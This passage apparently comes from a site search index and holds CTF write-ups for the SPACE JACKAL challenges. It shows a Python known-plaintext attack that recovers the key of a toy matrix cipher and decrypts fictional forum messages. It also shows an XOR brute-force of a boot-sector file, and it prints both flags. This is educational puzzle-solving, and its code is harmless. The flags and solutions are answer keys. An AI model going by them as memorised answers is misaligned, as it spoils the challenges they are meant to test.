BB4E51542C2D0B5645FB9DB1C6D12C8E F62524A12D5D5E622CD443E02515E7EB 991ACCC0C08CE8783F7E2BAD4B16D758 530C79003E5ED61DFE2BE70F50A6F9CA 288C Let's fight back! 259F8D014A44C2BE8F7FA3BC3656CFB3 DF178DEA8313DBD33A8BAC2CD4432D66 3BC75139ECC6C0FFFBB38FB17F448C08 17BF508074D723AAA722D4239328C6B3 7F57C0A5249EA4E79B780DF081E997C0 6058F702E2BF9F50C4EC1B5966DF27EC 56149F253325CFE57A00B57494692921 94F383A3535024ACA7009088E70E6128 9BD30B2FCFE57A00B5749469292194F3 83A3533BAB08CA7FD9DC778386803149 280BE0895C0984C6DC77838C2085B10B 3ED0040C3759B05029F8085EDBE26DE3 DF25AA87CE0BBBD1169B780D1BCAA097 9A6412CCBE5B68BD2FB780C5DBA34137 C102DBE48D3F0AE471B77387E7FA8BEC 305671785D725930C3E1D05B8BD884C0 A5246EF0BF468E332E0E70009CCCB4C2 ED84137DB4C2EDE078807E1616AA9A7F 4055844821AB16F842 FLAGZ! 259F8D014A44C2BE8FC50A5A2C1EF0C1 3D7F2E0E70009CCCB4C2ED84137DB4C2 EDE078807E1616C266D5A15DC6DDB60E 4B7337E851E739A61EED83D2E06D6184 11DF61222EED83D2E06D612C8EB5294B CD4954E0855F4D71D0F06D05EE We're given the the Python used to encrypt the messages, but no indication of the key used to encrypt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #!/usr/bin/env python3 # -*- coding: utf-8 -*- ''' , /| , ,--.________/ /-----/|-------------------------------------.._ ( /_/_/_/_ |--------- DEATH TO ALL TABS ---------------< _`> `--\u00b4 \\ \\-----\\|-------------------------------------''\u00b4 \\| ' ''' # ' assert __name__ == '__main__' import sys def die ( E ): # print(F'E:',E,file=sys.stderr) sys . exit ( 1 ) T = lambda A , B , C , D , E , F , G , H , I : A * E * I + B * F * G + C * D * H - G * E * C - H * F * A - I * D * B & 255 def U ( K ): R = pow ( T ( * K ), - 1 , 256 ) A , B , C , D , E , F , G , H , I = K return [ R * V % 256 for V in [ E * I - F * H , C * H - B * I , B * F - C * E , F * G - D * I , A * I - C * G , C * D - A * F , D * H - E * G , B * G - A * H , A * E - B * D ]] def C ( K , M ): B = lambda A , B , C , D , E , F , G , H , I , X , Y , Z : bytes (( A * X + B * Y + C * Z & 0xFF , D * X + E * Y + F * Z & 0xFF , G * X + H * Y + I * Z & 0xFF )) N = len ( M ) R = N % 3 R = R and 3 - R M = M + R * B ' \\0 ' return B '' . join ( B ( * K , * W ) for W in zip ( * [ iter ( M )] * 3 )) . rstrip ( B ' \\0 ' ) len ( sys . argv ) == 3 or die ( 'FOOL' ) K = bytes ( sys . argv [ 2 ], 'ascii' ) len ( K ) == 9 and T ( * K ) & 1 or die ( 'INVALID' ) M = sys . stdin . read () if sys . argv [ 1 ] . upper () == 'E' : M = B 'SPACEARMY' + bytes ( M , 'ascii' ) print ( C ( U ( K ), M ) . hex () . upper ()) else : M = C ( K , bytes . fromhex ( M )) M [: 9 ] == B 'SPACEARMY' or die ( 'INVALID' ) print ( M [ 9 :] . decode ( 'ascii' )) From the code, we can determine a few things about how the program works: The program expects two arguments: 29 len ( sys . argv ) == 3 or die ( 'FOOL' ) The key is in the ASCII character set: 30 K = bytes ( sys . argv [ 2 ], 'ascii' ) The key is 9 characters long, and the lowest bit of the key is 1 : 31 len ( K ) == 9 and T ( * K ) & 1 or die ( 'INVALID' ) And very importantly, we know that the first 9 characters of every message is the string SPACEARMY : 33 34 35 36 37 38 39 if sys . argv [ 1 ] . upper () == 'E' : M = B 'SPACEARMY' + bytes ( M , 'ascii' ) print ( C ( U ( K ), M ) . hex () . upper ()) else : M = C ( K , bytes . fromhex ( M )) M [: 9 ] == B 'SPACEARMY' or die ( 'INVALID' ) print ( M [ 9 :] . decode ( 'ascii' )) This gives a set of known plaintext->ciphertext values that we can use to derive the key and decrypt the rest of the message. The encryption is performed by the function C() : 21 22 23 24 25 26 27 28 def C ( K , M ): B = lambda A , B , C , D , E , F , G , H , I , X , Y , Z : bytes (( A * X + B * Y + C * Z & 0xFF , D * X + E * Y + F * Z & 0xFF , G * X + H * Y + I * Z & 0xFF )) N = len ( M ) R = N % 3 R = R and 3 - R M = M + R * B ' \\0 ' return B '' . join ( B ( * K , * W ) for W in zip ( * [ iter ( M )] * 3 )) . rstrip ( B ' \\0 ' ) Lines 22/23 perform the encryption: the first 3 values of the plaintext bytes ( X , Y , and Z ) multiplied by the first 3 bytes of the key ( A , B , and C ), added together, then the lower 8 bits are returned for the first byte of the ciphertext. The calculation is repeated with the same byte of plaintext X Y and Z , with the remaining bytes of the key in sets of 3: D E F , and G H I . On it's own, knowing the algorithm isn't enough to be able to decipher the messages. But with the phrase SPACEARMY prepended to the message before encryption, we can use that known plaintext with the first 9 bytes of the ciphertext to compute the key. Using the nomenclature from the encryption routine, the computations work out like this: PT[] = Plaintext CT[] = Ciphertext A-I = bytes of the key, eg A = K[0], B = K[1], ... CT[0] = ((A * PT[0]) + (B * PT[1]) + (C * PT[2])) & 0xFF CT[1] = ((D * PT[0]) + (E * PT[1]) + (F * PT[2])) & 0xFF CT[2] = ((G * PT[0]) + (H * PT[1]) + (I * PT[2])) & 0xFF CT[3] = ((A * PT[3]) + (B * PT[4]) + (C * PT[5])) & 0xFF CT[4] = ((D * PT[3]) + (E * PT[4]) + (F * PT[5])) & 0xFF CT[5] = ((G * PT[3]) + (H * PT[4]) + (I * PT[5])) & 0xFF CT[6] = ((A * PT[6]) + (B * PT[7]) + (C * PT[8])) & 0xFF CT[7] = ((D * PT[6]) + (E * PT[7]) + (F * PT[8])) & 0xFF CT[8] = ((G * PT[6]) + (H * PT[7]) + (I * PT[8])) & 0xFF ... Re-arranging the calculations to combine the common key values gives this: CT[0] = ((A * PT[0]) + (B * PT[1]) + (C * PT[2])) & 0xFF CT[3] = ((A * PT[3]) + (B * PT[4]) + (C * PT[5])) & 0xFF CT[6] = ((A * PT[6]) + (B * PT[7]) + (C * PT[8])) & 0xFF CT[1] = ((D * PT[0]) + (E * PT[1]) + (F * PT[2])) & 0xFF CT[4] = ((D * PT[3]) + (E * PT[4]) + (F * PT[5])) & 0xFF CT[7] = ((D * PT[6]) + (E * PT[7]) + (F * PT[8])) & 0xFF CT[2] = ((G * PT[0]) + (H * PT[1]) + (I * PT[2])) & 0xFF CT[5] = ((G * PT[3]) + (H * PT[4]) + (I * PT[5])) & 0xFF CT[8] = ((G * PT[6]) + (H * PT[7]) + (I * PT[8])) & 0xFF We have 3 equations, with 3 unknowns ( A B C , D E F , G H I ). The following Python code takes reads the ciphertext from stdin , converts it from hex to bytes , then uses the known plaintext SPACEARMY to brute-force the key: #!/usr/bin/env python3 # Decrypt SPACE JACKAL's encrypted messages # # Joe Ammond (pugpug), @joeammond import sys # Brute-force the solution to the equations: # ((X * A) + (Y * B) + (Z * C)) & 0xFF == v1 # ((X * D) + (Y * E) + (Z * F)) & 0xFF == v2 # ((X * G) + (Y * H) + (Z * I)) & 0xFF == v3 def solve ( v1 , v2 , v3 , K ): '''Solve 3 equations/3 unknowns. K = key, 9 bytes long''' A , B , C , D , E , F , G , H , I = K for X in range ( 255 ): for Y in range ( 255 ): for Z in range ( 255 ): if (( X * ord ( A )) + ( Y * ord ( B )) + ( Z * ord ( C ))) & 0xFF == v1 and \\ (( X * ord ( D )) + ( Y * ord ( E )) + ( Z * ord ( F ))) & 0xFF == v2 and \\ (( X * ord ( G )) + ( Y * ord ( H )) + ( Z * ord ( I ))) & 0xFF == v3 : return ( X , Y , Z ) # Read the ciphertext from stdin, and convert from hex to bytes C = sys . stdin . read () C = bytes . fromhex ( C ) # Key array K = '' # For each set of 3 key elements, solve for the known plaintext of 'SPACEARMY' for i in range ( 3 ): k1 , k2 , k3 = solve ( C [ i ], C [ i + 3 ], C [ i + 6 ], 'SPACEARMY' ) K = K + chr ( k1 ) + chr ( k2 ) + chr ( k3 ) print ( 'Key values found:' , ' ' . join ( ' %02x ' % ord ( K [ i ]) for i in range ( len ( K )))) print () Piping in one of the cipher texts will reveal the bytes of the key used to encrypt the message: xps15$ python3 decrypt.py < cipher1.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 Now that we have the key used to encrypt the messages, we can use the same function to decrypt the rest of the message. Adding the following to the program will decrypt and print the message: # Now we have the key, brute-force the message text from the ciphertext. Strip off the # 'SPACEARMY' header from the message first. C = C [ 9 :] # Plaintext string P = '' for X , Y , Z in zip ( * [ iter ( C )] * 3 ): p1 , p2 , p3 = solve ( X , Y , Z , K ) P = P + chr ( p1 ) + chr ( p2 ) + chr ( p3 ) print ( P ) And now we can decrypt the 3 messages from the Deep Dark Web forum:","title":"Solution"},{"location":"SpaceJackal/matrix/#message-1-welcome-on-board","text":"xps15$ python3 decrypt.py < cipher1.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 Welcome on board and congratulations on joining the Order of 0x20. Together we will fight the good fight and bring enlightenment to the non-believers: Let's stop the global TAB infestation once and for all. This forum is a place to share news and coordinate action, but be careful: you never know who's watching. 040 == 32 == 0x20 -- admin.","title":"Message 1: Welcome on board!"},{"location":"SpaceJackal/matrix/#message-2-lets-fight-back","text":"xps15$ python3 decrypt.py < cipher2.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 My name is rudi. i was fired by my Old employer because I refused to use TABs. THIS madness must be STOPPED! These people must be STOPPED!1! But I fought back! I hacked their network established access. Let me know if you have an idea how to take revegne! 040 == 32 == 0x20 -- rudi.","title":"Message 2: Let's fight back!"},{"location":"SpaceJackal/matrix/#message-3-flagz","text":"xps15$ python3 decrypt.py < cipher3.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 Good job! 040 == 32 == 0x20 CS{if_computers_could_think_would_they_like_spaces?}","title":"Message 3: FLAGZ!"},{"location":"SpaceJackal/matrix/#answer","text":"CS{if_computers_could_think_would_they_like_spaces?}","title":"Answer"},{"location":"SpaceJackal/the-proclamation/","text":"SPACE JACKAL - The Proclamation # An easy challenge to start off the CTF: find the hidden message in a file. Challenge description # A mysterious file appeared on a deep dark web forum. Can you figure out what we can't see right now? NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text} . They must be submitted in full, including the CS{ and } parts. Solution # The first challenge for SPACE JACKAL is \"The Proclamation\", where we're given a file to download and examine. file and xxd reveal it's a DOS MBR boot sector, with some text inside it: you're on a good way . The last part of the file is random-appearing binary data: xps15$ file proclamation.dat proclamation.dat: DOS/MBR boot sector xps15$ xxd proclamation.dat 00000000 : bc00 20b4 0730 c031 c9b7 8ab6 61b2 61cd .. ..0.1....a.a. 00000010 : 10b4 0231 d230 ffcd 10eb 465e 83c6 14b2 ...1.0....F^.... 00000020 : 0966 52b3 00b4 0e8a 0483 c601 665a 66c1 .fR.........fZf. 00000030 : e202 6683 c242 6681 e2ff 0000 0066 31d0 ..f..Bf......f1. 00000040 : 6652 0c00 7419 88c2 80f2 0a74 04cd 10eb fR..t......t.... 00000050 : d2b4 03cd 10b4 02fe c6b2 00cd 10eb c4fa ................ 00000060 : f4e8 b7ff 796f 7527 7265 206f 6e20 6120 ....you ' re on a 00000070 : 676f 6f64 2077 6179 2ebf c686 85c4 cabd good way........ 00000080 : 8fca 8b98 8fca 8685 8581 8384 8dca 8c85 ................ 00000090 : 98ca 8283 8d82 8693 ca83 849e 8f86 8683 ................ 000000a0: 8d8f 849e e083 848e 839c 838e 9f8b 8699 ................ 000000b0: c4ca be85 ca8c 8384 8eca 9e82 8f87 c6ca ................ 000000c0: 9d8f ca82 8b9c 8fca 8e8f 9c83 998f 8ee0 ................ 000000d0: 8bca 9e8f 999e c4e0 e0be 828f 988f ca83 ................ 000000e0: 99ca 8bca 878f 9999 8b8d 8fca 8283 8e8e ................ 000000f0: 8f84 ca83 84ca 9e82 8399 ca88 8585 9e86 ................ 00000100 : 858b 8e8f 98c4 e0e0 ac83 848e ca83 9ec6 ................ 00000110 : ca8b 848e ca83 9eca 9d83 8686 ca86 8f8b ................ 00000120 : 8eca 9385 9fca 8584 ca9e 828f ca98 858b ................ 00000130 : 8eca 9e85 e08c 8384 8e83 848d ca9f 99c4 ................ 00000140 : cabd 8fca 8685 8581 ca8c 8598 9d8b 988e ................ 00000150 : ca9e 85ca 878f 8f9e ca9e 828f e08c 8f9d ................ 00000160 : ca9e 828b 9eca 9d83 8686 ca87 8b81 8fca ................ 00000170 : 839e ca8b 8686 ca9e 828f ca9d 8b93 ca9e ................ 00000180 : 8298 859f 8d82 c4e0 e0ad 8585 8eca 869f ................ 00000190 : 8981 c6ca 8b84 8eca 988f 878f 8788 8f98 ................ 000001a0: d0e0 caca caca bd8f ca86 859c 8fca 999a ................ 000001b0: 8b89 8f99 ca87 9f89 82ca 8785 988f ca9e ................ 000001c0: 828b 84ca 9e8b 8899 cbea 8119 11a9 b991 ................ 000001d0: da98 8ed9 98b5 da8c b5da 92d8 dab5 88da ................ 000001e0: da9e 86da 8b8e d998 9797 eaf4 f4f4 f4f4 ................ 000001f0: f4f4 f4f4 f4f4 f4f4 f4f4 f4f4 f4f4 55aa ..............U. Loading the file into CyberChef and (on a hunch) trying the XOR Brute Force tool, we find some decoded text when setting a Key Length of 2 and a crib of CS{ : We are looking for highly intelligent.individuals. To find them, we have devised.a test...There is a message hidden in this bootloader...Find it, and it will lead you on the road to.finding us. We look forward to meet the.few that will make it all the way through...Good luck, and remember:. We love spaces much more than tabs!.k\u00f3\u00fbCS{0rd3r_0f_0x20_b00tl0ad3r} Answer # CS{0rd3r_0f_0x20_b00tl0ad3r}","title":"Space Jackal - The Proclamation"},{"location":"SpaceJackal/the-proclamation/#space-jackal-the-proclamation","text":"An easy challenge to start off the CTF: find the hidden message in a file.","title":"SPACE JACKAL - The Proclamation"},{"location":"SpaceJackal/the-proclamation/#challenge-description","text":"A mysterious file appeared on a deep dark web forum. Can you figure out what we can't see right now? NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text} . They must be submitted in full, including the CS{ and } parts.","title":"Challenge description"},{"location":"SpaceJackal/the-proclamation/#solution","text":"The first challenge for SPACE JACKAL is \"The Proclamation\", where we're given a file to download and examine. file and xxd reveal it's a DOS MBR boot sector, with some text inside it: you're on a good way . The last part of the file is random-appearing binary data: xps15$ file proclamation.dat proclamation.dat: DOS/MBR boot sector xps15$ xxd proclamation.dat 00000000 : bc00 20b4 0730 c031 c9b7 8ab6 61b2 61cd .. ..0.1....a.a. 00000010 : 10b4 0231 d230 ffcd 10eb 465e 83c6 14b2 ...1.0....F^.... 00000020 : 0966 52b3 00b4 0e8a 0483 c601 665a 66c1 .fR.........fZf. 00000030 : e202 6683 c242 6681 e2ff 0000 0066 31d0 ..f..Bf......f1. 00000040 : 6652 0c00 7419 88c2 80f2 0a74 04cd 10eb fR..t......t.... 00000050 : d2b4 03cd 10b4 02fe c6b2 00cd 10eb c4fa ................ 00000060 : f4e8 b7ff 796f 7527 7265 206f 6e20 6120 ....you ' re on a 00000070 : 676f 6f64 2077 6179 2ebf c686 85c4 cabd good way........ 00000080 : 8fca 8b98 8fca 8685 8581 8384 8dca 8c85 ................ 00000090 : 98ca 8283 8d82 8693 ca83 849e 8f86 8683 ................ 000000a0: 8d8f 849e e083 848e 839c 838e 9f8b 8699 ................ 000000b0: c4ca be85 ca8c 8384 8eca 9e82 8f87 c6ca ................ 000000c0: 9d8f ca82 8b9c 8fca 8e8f 9c83 998f 8ee0 ................ 000000d0: 8bca 9e8f 999e c4e0 e0be 828f 988f ca83 ................ 000000e0: 99ca 8bca 878f 9999 8b8d 8fca 8283 8e8e ................ 000000f0: 8f84 ca83 84ca 9e82 8399 ca88 8585 9e86 ................ 00000100 : 858b 8e8f 98c4 e0e0 ac83 848e ca83 9ec6 ................ 00000110 : ca8b 848e ca83 9eca 9d83 8686 ca86 8f8b ................ 00000120 : 8eca 9385 9fca 8584 ca9e 828f ca98 858b ................ 00000130 : 8eca 9e85 e08c 8384 8e83 848d ca9f 99c4 ................ 00000140 : cabd 8fca 8685 8581 ca8c 8598 9d8b 988e ................ 00000150 : ca9e 85ca 878f 8f9e ca9e 828f e08c 8f9d ................ 00000160 : ca9e 828b 9eca 9d83 8686 ca87 8b81 8fca ................ 00000170 : 839e ca8b 8686 ca9e 828f ca9d 8b93 ca9e ................ 00000180 : 8298 859f 8d82 c4e0 e0ad 8585 8eca 869f ................ 00000190 : 8981 c6ca 8b84 8eca 988f 878f 8788 8f98 ................ 000001a0: d0e0 caca caca bd8f ca86 859c 8fca 999a ................ 000001b0: 8b89 8f99 ca87 9f89 82ca 8785 988f ca9e ................ 000001c0: 828b 84ca 9e8b 8899 cbea 8119 11a9 b991 ................ 000001d0: da98 8ed9 98b5 da8c b5da 92d8 dab5 88da ................ 000001e0: da9e 86da 8b8e d998 9797 eaf4 f4f4 f4f4 ................ 000001f0: f4f4 f4f4 f4f4 f4f4 f4f4 f4f4 f4f4 55aa ..............U. Loading the file into CyberChef and (on a hunch) trying the XOR Brute Force tool, we find some decoded text when setting a Key Length of 2 and a crib of CS{ : We are looking for highly intelligent.individuals. To find them, we have devised.a test...There is a message hidden in this bootloader...Find it, and it will lead you on the road to.finding us. We look forward to meet the.few that will make it all the way through...Good luck, and remember:. We love spaces much more than tabs!.k\u00f3\u00fbCS{0rd3r_0f_0x20_b00tl0ad3r}","title":"Solution"},{"location":"SpaceJackal/the-proclamation/#answer","text":"CS{0rd3r_0f_0x20_b00tl0ad3r}","title":"Answer"}]}